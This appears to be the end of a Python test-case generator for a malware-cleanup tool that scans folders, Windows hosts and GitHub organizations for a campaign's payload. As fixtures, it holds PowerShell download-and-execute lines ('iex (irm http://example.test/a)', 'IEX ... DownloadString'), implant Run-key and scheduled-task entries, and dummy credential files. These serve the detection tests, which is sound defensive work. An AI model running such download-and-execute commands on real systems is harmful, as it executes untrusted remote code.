    "website": {"branches": {"main": {"vite.config.js": INFECTED_CONFIG}}},
}

case(
    "guide-github-all-at-once-needs-the-owners-name",
    why="One fix for every repository is the largest thing this tool does, "
        "so it is the one question yes does not answer: yes is what a hand "
        "types by habit. Only the organization's name goes ahead. Here yes "
        "and Enter are both turned away, the name is typed, and both "
        "repositories get their commit.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "all", "remove", "yes", "", "acme", ""],
    forge_files=SIGNED_IN,
    forge={"acme": TWO_ATTACKED},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "ALL 2 REPOSITORIES   acme",
            "This is a big step. Read this before you answer.",
            "one after another, without asking again.",
            "Type acme to go ahead, or no. yes is not enough here.",
            "Both repositories are fixed.",
        ],
        "forge_after": {
            "acme/shop": {"clean": ["main"], "history": "infected"},
            "acme/website": {"clean": ["main"], "history": "infected"},
        },
    },
)

case(
    "guide-github-all-at-once-leaves-alone-what-cannot-take-the-fix",
    why="restore for all, where only one of two has a push record. The "
        "warning names which can and which cannot before the name is asked "
        "for, the one that cannot is not touched, and the last screen does "
        "not call the organization fixed: it says one of two, and names "
        "the other as still carrying the payload.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "all", "restore", "acme", ""],
    forge_files=SIGNED_IN,
    forge={"acme": TWO_ATTACKED},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "1 can take restore:",
            "1 cannot, and will be left alone:",
            "GitHub no longer has the push record",
            "left alone",
            "1 of 2 repositories is fixed.",
            "Fix acme/website, which still carries the payload",
            "Do not open or pull what is not fixed",
        ],
        "forge_after": {"acme/shop": {"clean": ["main"]}},
    },
)

case(
    "guide-github-backing-out-of-all-at-once-changes-nothing",
    why="At the warning, no goes back to the choice and nothing has been "
        "pushed. Neither does none after it. Both repositories are exactly "
        "as they were.",
    command="guide",
    roots=["code"],
    files=ORDINARY_TREE,
    stdin=["organization", "acme", "all", "erase", "no", "none"],
    forge_files=SIGNED_IN,
    forge={"acme": TWO_ATTACKED},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "This is a big step. Read this before you answer.",
            "Left as it is. Nothing on GitHub was changed.",
            "2 repositories on GitHub carry the payload.",
        ],
        "must_not_print": ["Rewriting the history", "done,"],
    },
)

# ---------------------------------------------------------------------------
# The whole flow: one progress screen for every long job, and everything.
# ---------------------------------------------------------------------------

case(
    "guide-a-folder-check-says-how-far-it-has-come",
    why="A check that prints nothing while it works reads as a hang, and "
        "somebody who thinks the tool has hung stops it. Checking a folder "
        "shows the same progress screen as checking GitHub: how many stages "
        "are done, what it is on, how many files it has listed and what it "
        "has found. Into a pipe it is printed once, finished, and not as a "
        "frame per file.",
    command="guide",
    roots=["code"],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG,
           "code/proj/src/index.js": "export const a = 1\n"},
    stdin=["folder", "{{TREE}}/code", "", "no", ""],
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "Checking the folder",
            "This only reads. Nothing is changed.",
            "9 of 9",
            "now        finished",
            "so far     2 files listed",
            "1 finding confirmed",
        ],
        "must_not_print": ["0 of 9", "listing files"],
    },
)

host_case(
    "guide-everything-is-this-computer-and-then-github",
    why="The choice for somebody who thinks they were hit: this computer "
        "first, then GitHub, in one session. The computer here is clean and "
        "the organization is not. The exit code is 2: a clean result for one "
        "half must never be written over a payload found in the other, in "
        "either order. A word that is not on the screen asks again, and done "
        "ends it with GitHub left exactly as it was.",
    command="guide",
    stdin=["everything", "", "github", "organization", "acme", "none", "done"],
    host=host_state(),
    forge_files=SIGNED_IN,
    forge={"acme": {"shop": ATTACKED_SHOP}},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": [
            "everything     This computer first, then GitHub.",
            "Checking this computer",
            "12 of 12",
            "This computer is done. GitHub is next.",
            "Type organization, account or done. q quits.",
            "Checked 1 repository and 1 branch of acme.",
            "More on GitHub?",
        ],
    },
)

# ---------------------------------------------------------------------------
# The last of the machine check to leave the shell.
# ---------------------------------------------------------------------------

case(
    "host-credentials-are-inventory-and-are-never-read",
    why="If something else is a confirmed finding, these are what has to be "
        "changed, so they are counted on the screen and named in the report. "
        "Owning an SSH key is not a finding and the exit code stays 0. A "
        ".pub file is a public key, not a credential, and is not counted. "
        "Nothing is opened: a tool that reads private keys in order to list "
        "them has put them in its own memory and one bug away from its own "
        "report, so the secret in the .env here must appear nowhere.",
    roots=["code"],
    host=host_state(),
    files={"code/proj/src/index.js": "export const a = 1\n",
           "code/proj/.env": "API_TOKEN=do-not-print-this-value\n"},
    home={".ssh/id_ed25519": "-----BEGIN OPENSSH PRIVATE KEY-----\ndo-not-print-this-value\n",
          ".ssh/id_ed25519.pub": "ssh-ed25519 AAAA\n",
          ".aws/credentials": "[default]\naws_secret_access_key = do-not-print-this-value\n"},
    expect={
        "exit": 0,
        "findings": [{"level": "info",
                      "match": "2 private key or credential files and 1 .env file under the scanned paths."}],
        "must_not_report": NOTHING_FOUND,
        "must_not_print": ["do-not-print-this-value", "id_ed25519.pub"],
    },
)

host_case(
    "host-extension-naming-campaign-infrastructure-is-review",
    why="An installed extension that names a campaign address carries no "
        "confirmed indicator, and may be a security extension that blocks "
        "that address. It is worth a human's eyes and not a rebuild: review, "
        "with what matched and which file. The generic weak list is not "
        "used here, because every bundled extension contains folderOpen and "
        "windowsHide for ordinary reasons. An address that merely contains "
        "the campaign's is somebody else's and is not listed.",
    home={".vscode/extensions/pub.caller-1.0.0/out/main.js": "fetch('http://{{NETIP}}/a')\n",
          ".vscode/extensions/pub.neighbour-1.0.0/out/main.js": "fetch('http://{{NETIP}}9/a'); const o = { windowsHide: true }\n"},
    expect={
        "exit": 1,
        "findings": [{"level": "review",
                      "match": "extension references campaign infrastructure (",
                      "path": "pub.caller-1.0.0/out/main.js"}],
        "must_not_report": ["[HIT]", "pub.neighbour-1.0.0"],
    },
)

# ---------------------------------------------------------------------------
# Windows, as a machine handed over as data. The same boundary as Linux and
# macOS: what is not a file is a registry Run entry or a scheduled task, and
# both are answers the case supplies.
# ---------------------------------------------------------------------------

RUN_KEY = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"


def windows_state(**answers):
    return host_state(platform="windows", crontab=None,
                      **{"run_keys": "", "scheduled_tasks": "", **answers})


host_case(
    "host-windows-quiet-machine-is-clean",
    why="A Windows machine with nothing in its Run keys, no scheduled task "
        "of its own and nothing running is clean, and every section says it "
        "looked. Before this, the Rust engine refused Windows outright unless "
        "told to read files only, and the machine check was a separate "
        "PowerShell script nothing could test.",
    host=windows_state(),
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "0 Run key entries, none containing an indicator"},
                     {"level": "ok", "match": "no PowerShell profile in the home directory"}],
        "must_not_report": NOTHING_FOUND,
    },
)

host_case(
    "host-windows-run-key-starting-the-implant",
    why="The implant registers itself to start with Windows. A Run entry "
        "whose command is the implant is confirmed with nothing on disk, and "
        "the finding says how to remove it, with the value's name quoted so "
        "that a name containing a quote cannot end the command early. An "
        "ordinary entry beside it is not a finding.",
    host=windows_state(run_keys=
        RUN_KEY + "\tOneDrive\t\"C:\\Program Files\\OneDrive\\OneDrive.exe\" /background\n"
        + RUN_KEY + "\tSys's Helper\tC:\\Users\\x\\AppData\\Local\\{{IMPLANT}}.exe --quiet\n"),
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "implant run key entry", "path": "Sys's Helper"}],
        "must_print": ["Remove-ItemProperty", "'Sys''s"],
        "must_not_report": ["OneDrive"],
    },
)

host_case(
    "host-windows-implant-task-cannot-hide-among-windows-own",
    why="Windows ships hundreds of scheduled tasks under \\Microsoft\\, many "
        "of which run PowerShell, and listing them for review buries the one "
        "that matters. They are not listed. They are still checked: a task "
        "named for the implant is confirmed wherever it sits, because "
        "registering under \\Microsoft\\ is otherwise all an implant has to "
        "do. A task of the operator's own that pipes a download into "
        "PowerShell is review.",
    host=windows_state(scheduled_tasks=
        "\\Microsoft\\Windows\\UpdateOrchestrator\\\tSchedule Scan\tpowershell.exe -File http-check.ps1\n"
        "\\Microsoft\\Windows\\\t{{IMPLANT}}\tC:\\ProgramData\\svc.exe\n"
        "\\\tNightly\tpowershell -c iex (irm http://example.test/a)\n"),
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "implant scheduled task registered"},
                     {"level": "review", "match": "scheduled task runs a network or interpreter command", "path": "Nightly"}],
        "must_print": ["Unregister-ScheduledTask"],
        "must_not_report": ["Schedule Scan"],
    },
)

host_case(
    "host-windows-registry-not-read-is-not-clean",
    why="If PowerShell cannot be run, the Run keys and the scheduled tasks "
        "were not read. That is not the same as there being none, and the "
        "run must not exit 0 on the strength of two questions nobody "
        "answered.",
    host=windows_state(run_keys=None, scheduled_tasks=None),
    expect={
        "exit": 1,
        "findings": [{"level": "review", "match": "could not read the registry Run keys"},
                     {"level": "review", "match": "could not list the scheduled tasks"}],
        "must_not_report": ["[HIT]"],
    },
)

host_case(
    "host-windows-powershell-profile-downloads-and-runs",
    why="A PowerShell profile runs in every new PowerShell window. One that "
        "downloads a script and executes it is somebody else's code at every "
        "prompt, and nobody writes that line by accident. The same line "
        "commented out runs nothing and is clean.",
    host=windows_state(),
    home={"Documents/PowerShell/Microsoft.PowerShell_profile.ps1":
              "Set-Alias ll ls\nIEX (New-Object Net.WebClient).DownloadString('http://example.test/a')\n",
          "Documents/WindowsPowerShell/profile.ps1":
              "# iex (irm http://example.test/install.ps1)\nSet-Alias g git\n"},
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "PowerShell profile downloads and executes code",
                      "path": "Documents/PowerShell/Microsoft.PowerShell_profile.ps1"},
                     {"level": "ok", "match": "WindowsPowerShell/profile.ps1"}],
    },
)

for name, body in CASES.items():
    with open(os.path.join(D, name + ".json"), "w") as f:
        json.dump(body, f, indent=2)
        f.write("\n")

print(f"{len(CASES)} cases written to {D}")
